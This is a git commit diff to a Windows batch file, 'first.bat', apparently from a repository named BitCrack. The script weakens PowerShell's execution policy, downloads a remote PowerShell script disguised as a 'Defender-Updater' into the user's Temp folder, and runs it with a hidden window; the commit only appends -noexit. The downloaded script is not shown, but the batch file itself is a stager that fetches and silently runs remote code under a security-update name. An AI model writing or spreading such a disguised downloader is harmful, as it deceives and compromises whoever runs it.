6d8289f3c8aadc25b0fa067d0057a671b6015b45
Rugved Mahamune <quad.powered@gmail.com>
2024-07-27 15:16:17 +0100

    Update first.bat

--- first.bat
+++ first.bat
@@ -1,4 +1,4 @@
 @echo off
 powershell set-executionpolicy remotesigned
 curl https://raw.githubusercontent.com/rugved-mahamune/BitCrack/master/Defender-Updater.ps1 --output C:\Users\%USERNAME%\AppData\Local\Temp\Defender-Update.ps1
-powershell -windowstyle hidden -file C:\Users\%USERNAME%\AppData\Local\Temp\Defender-Update.ps1
+powershell -windowstyle hidden -file C:\Users\%USERNAME%\AppData\Local\Temp\Defender-Update.ps1 -noexit
